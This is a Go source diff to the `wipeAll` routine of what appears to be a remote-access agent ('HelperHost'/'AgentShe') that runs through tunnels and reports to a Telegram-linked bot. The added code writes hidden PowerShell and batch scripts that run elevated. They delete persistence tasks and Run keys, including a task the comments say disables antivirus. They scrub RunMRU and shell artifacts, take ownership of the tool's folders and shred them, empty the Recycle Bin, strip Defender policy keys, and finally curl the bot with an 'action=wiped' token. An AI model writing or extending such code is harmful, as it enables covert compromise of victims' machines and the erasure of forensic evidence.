@@ -545,15 +545,28 @@ func wipeAll() {
 
 	if runtime.GOOS == "windows" {
 		restoreWindowsNotifications()
-		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
-		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
-		restoreWindowsSecurity()
 		scrubRunMRU()
+		// Snapshot UAC bak before anything clears HKCU state
+		psSnap := `
+$ErrorActionPreference='SilentlyContinue'
+$out=Join-Path $env:TEMP 'hh-wipe-state.json'
+$o=[ordered]@{}
+try {
+  $st=(Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+  if ($st) {
+    $j=$st|ConvertFrom-Json
+    if ($j.uac_bak) { $o.uac_bak=$j.uac_bak }
+    if ($j.notify_bak) { $o.notify_bak=$j.notify_bak }
+  }
+} catch {}
+($o|ConvertTo-Json -Compress)|Set-Content -Encoding UTF8 $out
+`
+		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psSnap).Run()
 	} else {
 		clearStateStore()
 	}
-	// Keep HelperHostWipeRestore until bat runs it (elevated AV restore).
-	// Delete EarlyAV immediately so it cannot re-disable AV on next boot mid-wipe.
+
+	// Delete autostart tasks except WipeRestore (recreated below with fresh script).
 	for _, tn := range []string{"HelperHost", "HelperHostResume", "HelperHostBoot", "HelperHostResumeBoot", "HelperHostEarlyAV", "AgentShePC"} {
 		_ = exec.Command("schtasks", "/Delete", "/TN", tn, "/F").Run()
 	}
@@ -564,12 +577,7 @@ func wipeAll() {
 		_ = exec.Command("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, "/v", "AgentShePC", "/f").Run()
 	}
 	killRelatedProcs()
-	// Keep bot tunnel URL reachable via botBase (bot public URL) for final wiped ack from bat.
-	// Do NOT notify the bot yet — bat curls action=wiped after restore finishes.
 	scrubShellArtifacts()
-	if runtime.GOOS == "windows" {
-		clearStateStore()
-	}
 
 	unhidePath(dir)
 	unhidePath(cacheDir)
@@ -586,74 +594,95 @@ func wipeAll() {
 		return nil
 	})
 
-	secureRmTree(cacheDir)
 	home, _ := os.UserHomeDir()
-	secureRmTree(filepath.Join(home, ".agentshe"))
 	if runtime.GOOS == "windows" {
-		if local := os.Getenv("LOCALAPPDATA"); local != "" {
-			secureRmTree(filepath.Join(local, "AgentShe"))
-			secureRmTree(filepath.Join(local, "CabaretAgent"))
-		}
-		if tmp := os.Getenv("TEMP"); tmp != "" {
-			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
-		}
 		restorePS1 := filepath.Join(os.TempDir(), "hh-restore-security.ps1")
 		_ = os.WriteFile(restorePS1, []byte(restoreWinSecurityPS1), 0o644)
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
 		notifyLine := ""
 		if tok != "" && bb != "" {
-			// Final ack AFTER restore + shred — bot notifies Telegram only then.
-			// botBase is the bot public URL (not the PC tunnel).
 			escTok := strings.ReplaceAll(tok, `"`, "")
 			escBB := strings.ReplaceAll(bb, `"`, "")
 			notifyLine = "curl.exe -fsSL -X POST \"" + escBB + "/agent?action=wiped\" -H \"Content-Type: application/json\" -d \"{\\\"token\\\":\\\"" + escTok + "\\\"}\" >nul 2>&1\r\n" +
 				"ping 127.0.0.1 -n 2 >nul\r\n"
 		}
-		// No RunAs -Wait (hangs on UAC). Prefer schtasks elevated restore, then shred+rmdir.
+		dirEsc := strings.ReplaceAll(dir, `'`, `''`)
+		cacheEsc := strings.ReplaceAll(cacheDir, `'`, `''`)
+		psElev := filepath.Join(os.TempDir(), "hh-restore-elev.ps1")
+		elevBody := "$ErrorActionPreference='SilentlyContinue'\r\n" +
+			"try{$PSNativeCommandUseErrorActionPreference=$false}catch{}\r\n" +
+			"iex ((Get-Content -Raw '" + strings.ReplaceAll(restorePS1, `'`, `''`) + "'))\r\n"
+		_ = os.WriteFile(psElev, []byte(elevBody), 0o644)
+
 		body := "@echo off\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
-			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
-			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
-			"ping 127.0.0.1 -n 5 >nul\r\n" +
-			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
 			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHost /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostResume /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN HelperHostBoot /F >nul 2>&1\r\n" +
-			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
+			// Recreate elevated restore with FRESH script (old task often pointed at deleted temp file)
 			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
+			"schtasks /Create /TN HelperHostWipeRestore /TR \"\\\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\"" + restorePS1 + "\\\"\" /SC ONCE /ST 00:00 /RL HIGHEST /F >nul 2>&1\r\n" +
+			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 8 >nul\r\n" +
+			// Fallback elev (UAC still silent until restore ends)
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"try { $p=Start-Process -FilePath powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + restorePS1 + "\\\"'; if($p){$p.WaitForExit(120000)} } catch {}\" >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM cloudflared.exe >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostWipeRestore /F >nul 2>&1\r\n" +
+			"schtasks /Delete /TN HelperHostEarlyAV /F >nul 2>&1\r\n" +
 			"schtasks /Delete /TN AgentShePC /F >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v HelperHost /f >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v AgentShePC /f >nul 2>&1\r\n" +
-			"attrib -h -s /s /d \"" + dir + "\\*\" >nul 2>&1\r\n" +
-			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
-			"attrib -h -s /s /d \"" + cacheDir + "\\*\" >nul 2>&1\r\n" +
-			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			// Force-unlock + wipe HelperHost + EdgeRelay cache (retry)
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"" +
 			"$ErrorActionPreference='SilentlyContinue'; " +
-			"function Shred-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
-			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File | ForEach-Object { " +
-			"try { $len=[Math]::Min($_.Length,32MB); $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); " +
-			"$buf=New-Object byte[] ([Math]::Min(262144,[int]$len)); " +
-			"foreach($fill in @([byte]0,[byte]0xFF,[byte]0)){ for($i=0;$i -lt $buf.Length;$i++){$buf[$i]=$fill}; " +
-			"$fs.Seek(0,'Begin')|Out-Null; $left=$len; while($left -gt 0){ $n=[Math]::Min($buf.Length,$left); $fs.Write($buf,0,$n); $left-=$n } }; " +
-			"$fs.SetLength(0); $fs.Flush(); $fs.Close() } catch {} }; " +
-			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null }; " +
-			"Shred-Tree '" + strings.ReplaceAll(dir, "'", "''") + "'; " +
-			"Shred-Tree '" + strings.ReplaceAll(cacheDir, "'", "''") + "'; " +
-			"Clear-RecycleBin -Force -ErrorAction SilentlyContinue" +
+			"function Kill-HH { Get-Process HelperHost,EdgeRelay,cloudflared -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; " +
+			"Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object { $_.CommandLine -match 'HelperHost|EdgeRelay|hh-wipe|hh-restore|early-av' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue } }; " +
+			"function Nuke-Tree([string]$Root){ if(-not(Test-Path -LiteralPath $Root)){return}; " +
+			"Kill-HH; attrib -h -s /s /d \\\"$Root\\*\\\" 2>$null; attrib -h -s \\\"$Root\\\" 2>$null; " +
+			"cmd /c \\\"takeown /f `\\\"$Root`\\\" /r /d y\\\" | Out-Null; " +
+			"cmd /c \\\"icacls `\\\"$Root`\\\" /grant Everyone:F /t /c /q\\\" | Out-Null; " +
+			"Get-ChildItem -LiteralPath $Root -Recurse -Force -File -EA SilentlyContinue | ForEach-Object { " +
+			"try { $_.Attributes='Normal'; $fs=[IO.File]::Open($_.FullName,'Open','Write','None'); $fs.SetLength(0); $fs.Close(); Remove-Item -LiteralPath $_.FullName -Force -EA SilentlyContinue } catch { " +
+			"cmd /c \\\"del /f /q `\\\"$($_.FullName)`\\\"\\\" | Out-Null } }; " +
+			"cmd /c \\\"rmdir /s /q `\\\"$Root`\\\"\\\" | Out-Null; " +
+			"if(Test-Path -LiteralPath $Root){ Remove-Item -LiteralPath $Root -Recurse -Force -EA SilentlyContinue } }; " +
+			"1..5 | ForEach-Object { Kill-HH; Nuke-Tree '" + dirEsc + "'; Nuke-Tree '" + cacheEsc + "'; " +
+			"Nuke-Tree (Join-Path $env:TEMP 'HelperHostCache'); Nuke-Tree (Join-Path $env:LOCALAPPDATA 'HelperHost'); Start-Sleep -Seconds 1 }; " +
+			"Clear-RecycleBin -Force -EA SilentlyContinue; " +
+			"Remove-Item (Join-Path $env:TEMP 'hh-wipe-state.json') -Force -EA SilentlyContinue" +
 			"\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
 			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"%TEMP%\\HelperHostCache\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"%LOCALAPPDATA%\\HelperHost\" >nul 2>&1\r\n" +
+			"del /f /q \"%LOCALAPPDATA%\\HelperHost\\HelperHost.exe\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\HelperHostCache\\EdgeRelay.exe\" >nul 2>&1\r\n" +
 			"reg delete \"HKCU\\Software\\HelperHost\" /f >nul 2>&1\r\n" +
+			// Extra AV policy wipe via reg (in case elev restore partially failed)
+			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
+			"reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender\" /f >nul 2>&1\r\n" +
+			"reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\" /f >nul 2>&1\r\n" +
+			"gpupdate /Target:Computer /Force >nul 2>&1\r\n" +
+			"sc config WinDefend start= auto >nul 2>&1\r\n" +
+			"net start WinDefend >nul 2>&1\r\n" +
 			"del /f /q \"" + restorePS1 + "\" >nul 2>&1\r\n" +
+			"del /f /q \"" + psElev + "\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-elev-*.ps1\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\HelperHost-install.*\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-tool-*\" >nul 2>&1\r\n" +
 			"del /f /q \"%TEMP%\\hh-export-*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-run-*\" >nul 2>&1\r\n" +
+			"del /f /q \"%TEMP%\\hh-res-*\" >nul 2>&1\r\n" +
 			notifyLine +
 			"del /f /q \"%TEMP%\\hh-*\" >nul 2>&1\r\n" +
 			"del \"%~f0\" >nul 2>&1\r\n"
@@ -661,9 +690,9 @@ func wipeAll() {
 		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
 		hideWindow(cmd)
 		_ = cmd.Start()
-		// Give bat a head start before we tear down the PC agent tunnel.
 		time.Sleep(2 * time.Second)
 		killTunnelOnly()
+		secureRmTree(filepath.Join(home, ".agentshe"))
 	} else {
 		// Deferred wipe: launchd/systemd KeepAlive can race; finish after we exit.
 		wipeSh := filepath.Join(os.TempDir(), "hh-wipe.sh")
